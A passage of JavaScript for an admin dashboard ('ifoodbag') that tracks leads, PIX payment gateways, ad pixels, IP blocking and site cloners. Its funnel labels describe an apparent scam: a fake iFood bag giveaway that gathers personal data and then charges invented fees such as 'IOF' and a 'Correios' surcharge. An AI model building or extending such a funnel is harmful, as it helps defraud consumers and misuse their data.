    const clonersTotalEvents = document.getElementById('cloners-total-events');
    const clonersHighRisk = document.getElementById('cloners-high-risk');
    const clonersLastSeen = document.getElementById('cloners-last-seen');
    const clonersOfficialHosts = document.getElementById('cloners-official-hosts');
    const clonersDomainsBody = document.getElementById('cloners-domains-body');
    const clonersEventsBody = document.getElementById('cloners-events-body');
    const clonersPages = document.getElementById('cloners-pages');
    const clonersEmpty = document.getElementById('cloners-empty');
    const leadDetailModal = document.getElementById('lead-detail-modal');
    const leadDetailClose = document.getElementById('lead-detail-close');
    const leadDetailTitle = document.getElementById('lead-detail-title');
    const leadDetailSubtitle = document.getElementById('lead-detail-subtitle');
    const leadDetailMeta = document.getElementById('lead-detail-meta');
    const leadDetailBlockState = document.getElementById('lead-detail-block-state');
    const leadDetailLookupBtn = document.getElementById('lead-detail-lookup-transaction');
    const leadDetailLookupStatus = document.getElementById('lead-detail-lookup-status');
    const leadDetailBlockBtn = document.getElementById('lead-detail-block-ip');
    const leadDetailUnblockBtn = document.getElementById('lead-detail-unblock-ip');
    const leadDetailSummary = document.getElementById('lead-detail-summary');
    const leadDetailOverview = document.getElementById('lead-detail-overview');
    const leadDetailIdentity = document.getElementById('lead-detail-identity');
    const leadDetailAddress = document.getElementById('lead-detail-address');
    const leadDetailPayment = document.getElementById('lead-detail-payment');
    const leadDetailTransactionStatus = document.getElementById('lead-detail-transaction-status');
    const leadDetailTransactionSummary = document.getElementById('lead-detail-transaction-summary');
    const leadDetailTransactionPayload = document.getElementById('lead-detail-transaction-payload');
    const leadDetailTracking = document.getElementById('lead-detail-tracking');
    const leadDetailDevice = document.getElementById('lead-detail-device');
    const leadDetailTechnical = document.getElementById('lead-detail-technical');
    const leadDetailPages = document.getElementById('lead-detail-pages');
    const leadDetailPayload = document.getElementById('lead-detail-payload');
    const leadDetailCopyPayload = document.getElementById('lead-detail-copy-payload');
    const ipBlacklistBody = document.getElementById('ip-blacklist-body');
    const ipBlacklistCount = document.getElementById('ip-blacklist-count');
    const ipBlacklistEmpty = document.getElementById('ip-blacklist-empty');
    const metricTotal = document.getElementById('metric-total');
    const metricPix = document.getElementById('metric-pix');
    const metricFrete = document.getElementById('metric-frete');
    const metricCep = document.getElementById('metric-cep');
    const metricUpdated = document.getElementById('metric-updated');
    const metricBase = document.getElementById('metric-base');
    const metricConvPix = document.getElementById('metric-conv-pix');
    const metricConvFrete = document.getElementById('metric-conv-frete');
    const metricConvCep = document.getElementById('metric-conv-cep');
    const metricActiveGateway = document.getElementById('metric-active-gateway');
    const metricBestGateway = document.getElementById('metric-best-gateway');
    const metricGatewayGhostspayConv = document.getElementById('metric-gateway-ghostspay-conv');
    const metricGatewayGhostspayDetail = document.getElementById('metric-gateway-ghostspay-detail');
    const metricGatewaySunizeConv = document.getElementById('metric-gateway-sunize-conv');
    const metricGatewaySunizeDetail = document.getElementById('metric-gateway-sunize-detail');
    const metricGatewayParadiseConv = document.getElementById('metric-gateway-paradise-conv');
    const metricGatewayParadiseDetail = document.getElementById('metric-gateway-paradise-detail');
    const metricGatewayAtomopayConv = document.getElementById('metric-gateway-atomopay-conv');
    const metricGatewayAtomopayDetail = document.getElementById('metric-gateway-atomopay-detail');
    const funnelPix = document.getElementById('funnel-pix');
    const funnelFrete = document.getElementById('funnel-frete');
    const funnelCep = document.getElementById('funnel-cep');
    const funnelPixValue = document.getElementById('funnel-pix-value');
    const funnelFreteValue = document.getElementById('funnel-frete-value');
    const funnelCepValue = document.getElementById('funnel-cep-value');
    const nativeFunnelBase = document.getElementById('native-funnel-base');
    const nativeFunnelEmpty = document.getElementById('native-funnel-empty');
    const nativeFunnelTrack = document.getElementById('native-funnel-track');
    const navItems = document.querySelectorAll('.admin-nav-item');
    const pagesGrid = document.getElementById('pages-grid');
    const pagesInsights = document.getElementById('pages-insights');
    const backredirectGrid = document.getElementById('backredirect-grid');
    const backredirectInsights = document.getElementById('backredirect-insights');
    const backredirectTotal = document.getElementById('backredirect-total');
    const backredirectTopPage = document.getElementById('backredirect-top-page');
    const backredirectTopRate = document.getElementById('backredirect-top-rate');
    const salesBase = document.getElementById('sales-base');
    const salesUpdated = document.getElementById('sales-updated');
    const salesPaidTotal = document.getElementById('sales-paid-total');
    const salesRevenueTotal = document.getElementById('sales-revenue-total');
    const salesTopPositioningLabel = document.getElementById('sales-top-positioning-label');
    const salesTopCityLabel = document.getElementById('sales-top-city-label');
    const salesTopDeviceLabel = document.getElementById('sales-top-device-label');
    const salesPositioningWinner = document.getElementById('sales-positioning-winner');
    const salesPositioningDetail = document.getElementById('sales-positioning-detail');
    const salesCityWinner = document.getElementById('sales-city-winner');
    const salesCityDetail = document.getElementById('sales-city-detail');
    const salesDeviceWinner = document.getElementById('sales-device-winner');
    const salesDeviceDetail = document.getElementById('sales-device-detail');
    const salesPositioningList = document.getElementById('sales-positioning-list');
    const salesCityList = document.getElementById('sales-city-list');
    const salesDeviceList = document.getElementById('sales-device-list');
    const publicAudienceBuild = document.getElementById('public-audience-build');
    const publicAudienceStatus = document.getElementById('public-audience-status');
    const publicAudienceConfidence = document.getElementById('public-audience-confidence');
    const publicAudienceResult = document.getElementById('public-audience-result');
    const gatewaySalesGrid = document.getElementById('gateway-sales-grid');
    const gatewaySalesBase = document.getElementById('gateway-sales-base');
    const gatewaySalesUpdated = document.getElementById('gateway-sales-updated');
    const gatewaySalesTopGateway = document.getElementById('gateway-sales-top-gateway');
    const gatewaySalesCurrentFilter = document.getElementById('gateway-sales-current-filter');
    const gatewaySalesTotalRevenue = document.getElementById('gateway-sales-total-revenue');
    const gatewaySalesTotalCount = document.getElementById('gateway-sales-total-count');
    const gatewaySalesSelectedChip = document.getElementById('gateway-sales-selected-chip');
    const gatewaySalesSearch = document.getElementById('gateway-sales-search');
    const gatewaySalesDetailRevenue = document.getElementById('gateway-sales-detail-revenue');
    const gatewaySalesDetailCount = document.getElementById('gateway-sales-detail-count');
    const gatewaySalesStatus = document.getElementById('gateway-sales-status');
    const gatewaySalesBody = document.getElementById('gateway-sales-body');
    const adminPage = document.body.getAttribute('data-admin') || '';
    const testPixelBtn = document.getElementById('admin-test-pixel');
    const testPixelStatus = document.getElementById('admin-test-pixel-status');
    const testTikTokPixelBtn = document.getElementById('admin-test-tiktok-pixel');
    const testTikTokPixelStatus = document.getElementById('admin-test-tiktok-pixel-status');
    const testUtmfyBtn = document.getElementById('admin-test-utmfy');
    const testUtmfyStatus = document.getElementById('admin-test-utmfy-status');
    const saleUtmfyBtn = document.getElementById('admin-sale-utmfy');
    const saleUtmfyStatus = document.getElementById('admin-sale-utmfy-status');
    const testPushcutBtn = document.getElementById('admin-test-pushcut');
    const testPushcutStatus = document.getElementById('admin-test-pushcut-status');
    const processDispatchBtn = document.getElementById('admin-process-dispatch');
    const processDispatchStatus = document.getElementById('admin-process-dispatch-status');
    const featureOrderbump = document.getElementById('feature-orderbump');
    const overviewRangePreset = document.getElementById('overview-range-preset');
    const overviewRangeFrom = document.getElementById('overview-range-from');
    const overviewRangeTo = document.getElementById('overview-range-to');
    const overviewRangeApply = document.getElementById('overview-range-apply');
    const overviewRangeReset = document.getElementById('overview-range-reset');
    const overviewRangeStatus = document.getElementById('overview-range-status');
    const hasOverviewRangeControls = !!(overviewRangePreset || overviewRangeFrom || overviewRangeTo);
    const OVERVIEW_RANGE_STORAGE_KEY = 'ifoodbag.admin.overview.range.v1';
    const ADMIN_SETTINGS_CACHE_STORAGE_KEY = 'ifoodbag.admin.settings.cache.v1';

    let offset = 0;
    const limit = 50;
    let loadingLeads = false;
    let loadingGatewayOrderDailyStats = false;
    const emptyGatewayStats = () => ({
        ghostspay: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 },
        sunize: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 },
        paradise: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 },
        atomopay: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 }
    });
    const metrics = {
        total: 0,
        pix: 0,
        frete: 0,
        cep: 0,
        paid: 0,
        lastUpdated: '',
        funnel: null,
        gatewayStats: emptyGatewayStats()
    };
    let gatewayOrderDailyStats = emptyGatewayStats();
    const funnelPageMeta = {
        home: { label: 'index.html', desc: 'Pagina inicial (entrada do funil)' },
        quiz: { label: 'quiz.html', desc: 'Perguntas de qualificacao' },
        personal: { label: 'dados.html', desc: 'Coleta de dados pessoais' },
        cep: { label: 'endereco.html', desc: 'Consulta e confirmacao de CEP' },
        processing: { label: 'processando.html', desc: 'Video + verificacao de elegibilidade' },
        success: { label: 'sucesso.html', desc: 'Aprovado e chamada para resgate' },
        checkout: { label: 'checkout.html', desc: 'Endereco e selecao de frete' },
        orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Bag' },
        pix: { label: 'pix.html', desc: 'Pagamento via PIX' },
        'upsell-iof': { label: 'upsell-iof.html', desc: 'Upsell 1: taxa de IOF da bag' },
        'upsell-correios': { label: 'upsell-correios.html', desc: 'Upsell 2: taxa de objeto grande dos Correios' },
        upsell: { label: 'upsell.html', desc: 'Upsell 3: adiantamento do frete' }
    };
    let overviewRange = { preset: 'all', from: '', to: '' };
    let currentSettings = null;
    let currentSettingsLoaded = false;
    let currentSettingsStatus = 'idle';
    let currentSettingsRevision = '';
    let currentLeadDetail = null;
    let currentIpBlacklist = [];
    let gatewayTestRunning = false;
    let gatewaySalesState = {
        selectedGateway: '',
        query: '',
        loading: false
    };

    const ensurePushcutTemplateFields = () => {
        const pushcutSection = document.querySelector('.pushcut-settings');
        if (!pushcutSection) return;
        const pushcutGrid = pushcutSection.querySelector('.pushcut-settings__grid');
        if (!pushcutGrid) return;

        const ensureTemplateShell = () => {
            let shell = pushcutSection.querySelector('.pushcut-templates');
            if (!shell) {
                shell = document.createElement('div');
                shell.className = 'pushcut-templates';
                shell.innerHTML = `
                    <div class="admin-section-header">
                        <h3>Mensagens Pushcut</h3>
                        <span class="admin-chip">Templates</span>
                    </div>
                    <p class="admin-hint">Defina titulo e texto para cada evento.</p>
                    <div class="pushcut-templates__grid"></div>
                `;
                pushcutGrid.insertAdjacentElement('afterend', shell);
            }
            let grid = shell.querySelector('.pushcut-templates__grid');
            if (!grid) {
                grid = document.createElement('div');
                grid.className = 'pushcut-templates__grid';
                shell.appendChild(grid);
            }
            return grid;
        };

        const templateGrid = ensureTemplateShell();
        templateGrid.style.display = 'grid';
        templateGrid.style.gridTemplateColumns = 'repeat(auto-fit, minmax(260px, 1fr))';
        templateGrid.style.gap = '12px';

        const ensureField = ({ id, label, isTextarea = false }) => {
            let input = document.getElementById(id);
            let group = input?.closest('.input-group') || null;

            if (!input) {
                group = document.createElement('div');
                group.className = 'input-group';
                input = isTextarea ? document.createElement('textarea') : document.createElement('input');
                input.id = id;
                input.className = isTextarea
                    ? 'floating-input floating-input--textarea'
                    : 'floating-input';
                input.placeholder = ' ';
                if (!isTextarea) {
                    input.type = 'text';
                }
                const lbl = document.createElement('label');
                lbl.className = 'floating-label';
                lbl.htmlFor = id;
                lbl.textContent = label;
                group.appendChild(input);
                group.appendChild(lbl);
            }

            group.classList.remove('hidden');
            group.style.display = '';
            group.style.visibility = '';
            group.style.opacity = '';
            group.style.maxHeight = '';
            templateGrid.appendChild(group);
            return input;
        };

        pushcutCreatedTitle = ensureField({
            id: 'pushcut-created-title',
            label: 'Titulo PIX gerado'
        });
        pushcutConfirmedTitle = ensureField({
            id: 'pushcut-confirmed-title',
            label: 'Titulo PIX pago'
        });
        pushcutCreatedMessage = ensureField({
            id: 'pushcut-created-message',
            label: 'Mensagem PIX gerado',
            isTextarea: true
        });
        pushcutConfirmedMessage = ensureField({
            id: 'pushcut-confirmed-message',
            label: 'Mensagem PIX pago',
            isTextarea: true
        });
    };

    ensurePushcutTemplateFields();

    const hasPixelForm = !!(
        pixelEnabled ||
        pixelId ||
        pixelBackupId ||
        pixelCapiEnabled ||
        pixelCapiToken ||
        pixelCapiBackupToken ||
        pixelEventPage ||
        pixelEventQuiz ||
        pixelEventLead ||
        pixelEventCheckout ||
        pixelEventPurchase ||
        tiktokPixelEnabled ||
        tiktokPixelId ||
        tiktokPixelEventPage ||
        tiktokPixelEventQuiz ||
        tiktokPixelEventLead ||
        tiktokPixelEventCheckout ||
        tiktokPixelEventPurchase
    );
    const hasUtmfyForm = !!(
        utmfyEnabled ||
        utmfyEndpoint ||
        utmfyApi ||
        pushcutEnabled ||
        pushcutPixCreated ||
        pushcutPixConfirmed ||
        pushcutCreatedTitle ||
        pushcutCreatedMessage ||
        pushcutConfirmedTitle ||
        pushcutConfirmedMessage
    );
    const hasPaymentsForm = !!(
        paymentsActiveGateway ||
        paymentsGatewayOrder ||
        gatewayGhostspayEnabled ||
        gatewayGhostspayBaseUrl ||
        gatewayGhostspaySecretKey ||
        gatewayGhostspayCompanyId ||
        gatewayGhostspayWebhookToken ||
        gatewaySunizeEnabled ||
        gatewaySunizeBaseUrl ||
        gatewaySunizeApiKey ||
        gatewaySunizeApiSecret ||
        gatewayParadiseEnabled ||
        gatewayParadiseBaseUrl ||
        gatewayParadiseApiKey ||
        gatewayParadiseProductHash ||
        gatewayParadiseOrderbumpHash ||
        gatewayParadiseSource ||
        gatewayParadiseDescription ||
        gatewayAtomopayEnabled ||
        gatewayAtomopayBaseUrl ||
        gatewayAtomopayApiToken ||
        gatewayAtomopayOfferHash ||
        gatewayAtomopayProductHash ||
        gatewayAtomopayIofOfferHash ||
        gatewayAtomopayIofProductHash ||
        gatewayAtomopayCorreiosOfferHash ||
        gatewayAtomopayCorreiosProductHash ||
        gatewayAtomopayExpressoOfferHash ||
        gatewayAtomopayExpressoProductHash ||
        gatewayAtomopayWebhookToken
    );
    const hasFeatureForm = !!featureOrderbump;
    const wantsLeads = !!(leadsBody || metricTotal || metricPix || metricFrete || metricCep);
    const wantsPages = !!pagesGrid;
    const wantsBackredirects = !!backredirectGrid;
    const wantsSalesInsights = !!(salesPositioningList || salesCityList || salesDeviceList);
    const shouldAutoLoadSalesInsights = wantsSalesInsights && adminPage !== 'public';
    const wantsGatewaySales = !!(gatewaySalesGrid || gatewaySalesBody);
    const wantsCloners = !!(clonersDomainsBody || clonersEventsBody);

    const normalizeGatewayKey = (value) => {
        const normalized = String(value || '').trim().toLowerCase();
        if (normalized === 'ghostspay') return 'ghostspay';
        if (normalized === 'sunize') return 'sunize';
        if (normalized === 'paradise') return 'paradise';
        if (normalized === 'atomopay') return 'atomopay';
        return 'ghostspay';
    };

    const resolveGatewayMetricKey = (value) => {
        const normalized = String(value || '').trim().toLowerCase();
        if (normalized === 'ghostspay') return 'ghostspay';
        if (normalized === 'sunize') return 'sunize';
        if (normalized === 'paradise') return 'paradise';
        if (normalized === 'atomopay') return 'atomopay';
        return '';
    };

    const gatewayLabelForUi = (gateway) => {
        const normalized = normalizeGatewayKey(gateway);
        if (normalized === 'ghostspay') return 'GhostsPay';
        if (normalized === 'sunize') return 'Sunize';
        if (normalized === 'paradise') return 'Paradise';
        if (normalized === 'atomopay') return 'AtomoPay';
        return 'GhostsPay';
    };

    const gatewayOrderKeys = ['ghostspay', 'sunize', 'paradise', 'atomopay'];

    const normalizeGatewayOrderForUi = (value, fallback = 'ghostspay') => {
        const rawList = Array.isArray(value)
            ? value
            : String(value || '')
                .split(',')
                .map((item) => item.trim())
                .filter(Boolean);
        const order = [];
        rawList.forEach((item) => {
            const normalized = normalizeGatewayKey(item);
            if (gatewayOrderKeys.includes(normalized) && !order.includes(normalized)) {
                order.push(normalized);
            }
        });
        const fallbackGateway = normalizeGatewayKey(fallback);
        return [...new Set([...order, fallbackGateway, ...gatewayOrderKeys])];
    };

    const getGatewayOrderItems = () => Array.from(paymentsGatewayOrder?.querySelectorAll('[data-gateway-order-item]') || []);

    const getGatewayOrderFromUi = () => {
        const fromDom = getGatewayOrderItems()
            .map((item) => normalizeGatewayKey(item.getAttribute('data-gateway-order-item')))
            .filter((gateway) => gatewayOrderKeys.includes(gateway));
        return normalizeGatewayOrderForUi(fromDom, paymentsActiveGateway?.value || currentSettings?.payments?.activeGateway || 'ghostspay');
    };

    const getPrimaryGatewayFromUi = () => {
        const order = getGatewayOrderFromUi();
        return normalizeGatewayKey(order[0] || paymentsActiveGateway?.value || 'ghostspay');
    };

    const getGatewayEnabledInput = (gateway) => {
        const normalized = normalizeGatewayKey(gateway);
        if (normalized === 'ghostspay') return gatewayGhostspayEnabled;
        if (normalized === 'sunize') return gatewaySunizeEnabled;
        if (normalized === 'paradise') return gatewayParadiseEnabled;
        if (normalized === 'atomopay') return gatewayAtomopayEnabled;
        return null;
    };

    const getCurrentGatewaySettings = (gateway) => {
        const normalized = normalizeGatewayKey(gateway);
        return currentSettings?.payments?.gateways?.[normalized] || {};
    };

    const readCheckboxSetting = (input, currentValue = false) => (
        input ? !!input.checked : currentValue === true
    );

    const readInputSetting = (input, currentValue = '') => (
        input ? String(input.value || '').trim() : String(currentValue || '').trim()
    );

    const isGatewayEnabledForUi = (gateway) => {
        const normalized = normalizeGatewayKey(gateway);
        const input = getGatewayEnabledInput(normalized);
        if (input) return !!input.checked;
        return getCurrentGatewaySettings(normalized).enabled === true;
    };

    const normalizeGatewayStatsMap = (source = {}) => {
        const base = emptyGatewayStats();
        return {
            ghostspay: { ...base.ghostspay, ...(source.ghostspay || {}) },
            sunize: { ...base.sunize, ...(source.sunize || {}) },
            paradise: { ...base.paradise, ...(source.paradise || {}) },
            atomopay: { ...base.atomopay, ...(source.atomopay || {}) }
        };
    };

    const getGatewayMetricsForUi = (gateway) => {
        const normalized = normalizeGatewayKey(gateway);
        const stats = gatewayOrderDailyStats?.[normalized] || {};
        const generated = Number(stats.pix || 0);
        const paid = Number(stats.paid || 0);
        const conversionRaw = Number.isFinite(Number(stats.conversion))
            ? Number(stats.conversion)
            : (generated > 0 ? (paid / generated) * 100 : 0);
        const conversion = Math.max(0, Math.min(100, Number(conversionRaw || 0)));
        return {
            generated,
            paid,
            conversion
        };
    };

    const setGatewayOrderMetricText = (selector, gateway, value) => {
        const node = paymentsGatewayOrder?.querySelector?.(`[${selector}="${gateway}"]`);
        if (node) node.textContent = String(value);
    };

    const syncGatewayOrderStats = () => {
        if (!paymentsGatewayOrder) return;
        gatewayOrderKeys.forEach((gateway) => {
            const stats = getGatewayMetricsForUi(gateway);
            const conversionLabel = `${Math.round(stats.conversion)}%`;
            setGatewayOrderMetricText('data-gateway-order-generated', gateway, stats.generated);
            setGatewayOrderMetricText('data-gateway-order-paid', gateway, stats.paid);
            setGatewayOrderMetricText('data-gateway-order-conversion', gateway, conversionLabel);
            const bar = paymentsGatewayOrder.querySelector(`[data-gateway-order-conversion-bar="${gateway}"]`);
            if (bar) bar.style.width = `${stats.conversion}%`;
        });
    };

    const getTodayLocalRangeExact = () => {
        const now = new Date();
        const start = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 0, 0, 0, 0);
        const end = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 23, 59, 59, 999);
        return {
            fromIsoExact: start.toISOString(),
            toIsoExact: end.toISOString()
        };
    };

    const loadGatewayOrderDailyStats = async () => {
        if (!paymentsGatewayOrder || loadingGatewayOrderDailyStats) return;
        loadingGatewayOrderDailyStats = true;
        try {
            const range = getTodayLocalRangeExact();
            const url = new URL('/api/admin/leads', window.location.origin);
            url.searchParams.set('limit', '1');
            url.searchParams.set('offset', '0');
            url.searchParams.set('summary', '1');
            url.searchParams.set('summaryMax', '80000');
            url.searchParams.set('fromIsoExact', range.fromIsoExact);
            url.searchParams.set('toIsoExact', range.toIsoExact);
            const res = await adminFetch(url.toString());
            if (!res.ok) return;
            const data = await res.json().catch(() => ({}));
            gatewayOrderDailyStats = normalizeGatewayStatsMap(data?.summary?.gatewayStats || {});
            syncGatewayOrderStats();
        } catch (_error) {
            // Keep the last rendered values if the daily summary request fails.
        } finally {
            loadingGatewayOrderDailyStats = false;
        }
    };

    const syncGatewayOrderStates = () => {
        getGatewayOrderItems().forEach((item, index) => {
            const gateway = normalizeGatewayKey(item.getAttribute('data-gateway-order-item'));
            const enabled = isGatewayEnabledForUi(gateway);
            const indexNode = item.querySelector('.gateway-order-index');
            const stateNode = item.querySelector('[data-gateway-order-state]');
            const upButton = item.querySelector('[data-gateway-order-move="up"]');
            const downButton = item.querySelector('[data-gateway-order-move="down"]');
            if (indexNode) indexNode.textContent = String(index + 1);
            if (stateNode) {
                stateNode.textContent = enabled ? 'Ligado' : 'Desligado';
                stateNode.classList.toggle('is-on', enabled);
            }
            item.classList.toggle('is-disabled', !enabled);
            if (upButton) upButton.disabled = index === 0;
            if (downButton) downButton.disabled = index === getGatewayOrderItems().length - 1;
        });
        syncGatewayOrderStats();
    };

    const syncGatewayOrderMeta = () => {
        const primary = getPrimaryGatewayFromUi();
        if (paymentsActiveGateway) paymentsActiveGateway.value = primary;
        if (gatewayPriorityCurrent) gatewayPriorityCurrent.textContent = gatewayLabelForUi(primary);
        if (metricActiveGateway) metricActiveGateway.textContent = gatewayLabelForUi(primary);
        setCurrentGatewayCard(primary);
        syncGatewayOrderStates();
    };

    const syncGatewayOrderUi = (order = []) => {
        if (!paymentsGatewayOrder) {
            if (paymentsActiveGateway && order.length) {
                paymentsActiveGateway.value = normalizeGatewayKey(order[0]);
            }
            return;
        }
        const normalized = normalizeGatewayOrderForUi(order, paymentsActiveGateway?.value || 'ghostspay');
        normalized.forEach((gateway) => {
            const item = paymentsGatewayOrder.querySelector(`[data-gateway-order-item="${gateway}"]`);
            if (item) paymentsGatewayOrder.appendChild(item);
        });
        syncGatewayOrderMeta();
    };

    const getGatewayOrderDragAfterElement = (y) => {
        const items = getGatewayOrderItems().filter((item) => !item.classList.contains('is-dragging'));
        return items.reduce((closest, child) => {
            const box = child.getBoundingClientRect();
            const offset = y - box.top - box.height / 2;
            if (offset < 0 && offset > closest.offset) {
                return { offset, element: child };
            }
            return closest;
        }, { offset: Number.NEGATIVE_INFINITY, element: null }).element;
    };

    const initializeGatewayOrderControls = () => {
        if (!paymentsGatewayOrder) return;
        paymentsGatewayOrder.addEventListener('dragstart', (event) => {
            const item = event.target?.closest?.('[data-gateway-order-item]');
            if (!item) return;
            event.dataTransfer.effectAllowed = 'move';
            event.dataTransfer.setData('text/plain', item.getAttribute('data-gateway-order-item') || '');
            item.classList.add('is-dragging');
        });
        paymentsGatewayOrder.addEventListener('dragover', (event) => {
            event.preventDefault();
            const dragging = paymentsGatewayOrder.querySelector('.is-dragging');
            if (!dragging) return;
            const afterElement = getGatewayOrderDragAfterElement(event.clientY);
            if (!afterElement) {
                paymentsGatewayOrder.appendChild(dragging);
            } else {
                paymentsGatewayOrder.insertBefore(dragging, afterElement);
            }
            syncGatewayOrderStates();
        });
        paymentsGatewayOrder.addEventListener('drop', (event) => {
            event.preventDefault();
            syncGatewayOrderMeta();
        });
        paymentsGatewayOrder.addEventListener('dragend', () => {
            getGatewayOrderItems().forEach((item) => item.classList.remove('is-dragging'));
            syncGatewayOrderMeta();
        });
        paymentsGatewayOrder.addEventListener('click', (event) => {
            const button = event.target?.closest?.('[data-gateway-order-move]');
            if (!button || button.disabled) return;
            const item = button.closest('[data-gateway-order-item]');
            if (!item) return;
            const direction = button.getAttribute('data-gateway-order-move');
            if (direction === 'up' && item.previousElementSibling) {
                paymentsGatewayOrder.insertBefore(item, item.previousElementSibling);
            }
            if (direction === 'down' && item.nextElementSibling) {
                paymentsGatewayOrder.insertBefore(item.nextElementSibling, item);
            }
            syncGatewayOrderMeta();
        });
    };

    const formatPercent = (value) => {
        const numeric = Number(value || 0);
        if (!Number.isFinite(numeric)) return '0%';
        const rounded = Math.round(numeric * 10) / 10;
        if (Math.abs(rounded - Math.round(rounded)) < 0.001) {
            return `${Math.round(rounded)}%`;
        }
        return `${rounded.toFixed(1)}%`;
    };

    const syncGatewaySwitchState = (input, label) => {
        if (!label) return;
        if (currentSettingsStatus !== 'loaded') {
            const loadingText = currentSettingsStatus === 'unavailable' ? 'Indisponivel' : 'Carregando';
            label.textContent = loadingText;
            label.classList.remove('is-on');
            return;
        }
        const enabled = !!input?.checked;
        label.textContent = enabled ? 'Ligado' : 'Desligado';
        label.classList.toggle('is-on', enabled);
    };

    const syncGatewaySwitches = () => {
        syncGatewaySwitchState(gatewayGhostspayEnabled, gatewayGhostspayState);
        syncGatewaySwitchState(gatewaySunizeEnabled, gatewaySunizeState);
        syncGatewaySwitchState(gatewayParadiseEnabled, gatewayParadiseState);
        syncGatewaySwitchState(gatewayAtomopayEnabled, gatewayAtomopayState);
        syncGatewayOrderStates();
    };

    const setCurrentGatewayCard = (gateway) => {
        const active = normalizeGatewayKey(gateway);
        gatewayCards.forEach((card) => {
            const cardGateway = normalizeGatewayKey(card.getAttribute('data-gateway-card'));
            card.classList.toggle('is-current', cardGateway === active);
        });
    };

    const setGatewayCardOpen = (gateway, shouldOpen = true) => {
        const target = normalizeGatewayKey(gateway);
        gatewayCards.forEach((card) => {
            const cardGateway = normalizeGatewayKey(card.getAttribute('data-gateway-card'));
            const isOpen = shouldOpen && cardGateway === target;
            card.classList.toggle('is-open', isOpen);
            const toggleButton = card.querySelector('[data-gateway-config-toggle]');
            if (toggleButton) {
                toggleButton.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
                toggleButton.textContent = isOpen ? 'Fechar' : 'Configurar';
            }
        });
    };

    const toggleGatewayCard = (gateway) => {
        const target = normalizeGatewayKey(gateway);
        const current = gatewayCards.find((card) => normalizeGatewayKey(card.getAttribute('data-gateway-card')) === target);
        const shouldOpen = !(current && current.classList.contains('is-open'));
        setGatewayCardOpen(target, shouldOpen);
    };

    const setLoginVisible = (visible) => {
        if (loginWrap) loginWrap.classList.toggle('hidden', !visible);
        if (panelWrap) panelWrap.classList.toggle('hidden', visible);
    };

    const adminFetch = async (url, options = {}) => {
        const res = await fetch(url, {
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json' },
            ...options
        });
        return res;
    };

    const escapeHtml = (value) => String(value ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');

    const formatDetailValue = (value, fallback = '-') => {
        const text = String(value ?? '').trim();
        return text || fallback;
    };

    const readCachedAdminSettings = () => {
        try {
            const raw = localStorage.getItem(ADMIN_SETTINGS_CACHE_STORAGE_KEY);
            return raw ? JSON.parse(raw) : null;
        } catch (_error) {
            return null;
        }
    };

    const writeCachedAdminSettings = (data) => {
        try {
            localStorage.setItem(ADMIN_SETTINGS_CACHE_STORAGE_KEY, JSON.stringify(data || {}));
        } catch (_error) {
            // Ignore cache write failures.
        }
    };

    const ensureSettingsRetryModal = () => {
        let modal = document.getElementById('admin-settings-retry-modal');
        if (modal) {
            return {
                modal,
                message: document.getElementById('admin-settings-retry-message'),
                retryBtn: document.getElementById('admin-settings-retry-button'),
                closeBtn: document.getElementById('admin-settings-retry-close')
            };
        }

        const wrapper = document.createElement('div');
        wrapper.innerHTML = `
            <div id="admin-settings-retry-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="admin-settings-retry-title" aria-hidden="true">
                <div class="modal-card">
                    <button id="admin-settings-retry-close" class="modal-close" type="button" aria-label="Fechar">×</button>
                    <span class="modal-badge">Configuracoes</span>
                    <h3 id="admin-settings-retry-title" class="modal-title">Nao foi possivel carregar as configuracoes</h3>
                    <p id="admin-settings-retry-message" class="modal-subtitle">Tente novamente para atualizar os gateways, pixels e chaves do painel.</p>
                    <div style="display:flex;justify-content:flex-end;gap:12px;margin-top:20px;">
                        <button id="admin-settings-retry-button" class="btn-primary" type="button">Tentar novamente</button>
                    </div>
                </div>
            </div>
        `.trim();
        document.body.appendChild(wrapper.firstElementChild);
        modal = document.getElementById('admin-settings-retry-modal');
        const message = document.getElementById('admin-settings-retry-message');
        const retryBtn = document.getElementById('admin-settings-retry-button');
        const closeBtn = document.getElementById('admin-settings-retry-close');

        closeBtn?.addEventListener('click', () => {
            modal.classList.add('hidden');
            modal.setAttribute('aria-hidden', 'true');
            document.body.classList.remove('modal-open');
        });
        modal?.addEventListener('click', (event) => {
            if (event.target === modal) {
                modal.classList.add('hidden');
                modal.setAttribute('aria-hidden', 'true');
                document.body.classList.remove('modal-open');
            }
        });

        return { modal, message, retryBtn, closeBtn };
    };

    const showSettingsRetryModal = (messageText) => {
        const refs = ensureSettingsRetryModal();
        if (refs.message) {
            refs.message.textContent = String(messageText || 'Tente novamente para atualizar os gateways, pixels e chaves do painel.');
        }
        refs.modal?.classList.remove('hidden');
        refs.modal?.setAttribute('aria-hidden', 'false');
        document.body.classList.add('modal-open');
    };

    const hideSettingsRetryModal = () => {
        const modal = document.getElementById('admin-settings-retry-modal');
        if (!modal) return;
        modal.classList.add('hidden');
        modal.setAttribute('aria-hidden', 'true');
        document.body.classList.remove('modal-open');
    };

    const applyAdminSettingsToForm = (data = {}) => {
        currentSettings = data || {};

        if (hasPixelForm) {
            if (pixelEnabled) pixelEnabled.checked = !!data.pixel?.enabled;
            if (pixelId) pixelId.value = data.pixel?.id || '';
            if (pixelBackupId) pixelBackupId.value = data.pixel?.backupId || '';
            if (pixelCapiEnabled) pixelCapiEnabled.checked = !!data.pixel?.capi?.enabled;
            if (pixelCapiToken) pixelCapiToken.value = data.pixel?.capi?.accessToken || '';
            if (pixelCapiBackupToken) pixelCapiBackupToken.value = data.pixel?.capi?.backupAccessToken || '';
            if (pixelEventPage) pixelEventPage.checked = data.pixel?.events?.page_view !== false;
            if (pixelEventQuiz) pixelEventQuiz.checked = data.pixel?.events?.quiz_view !== false;
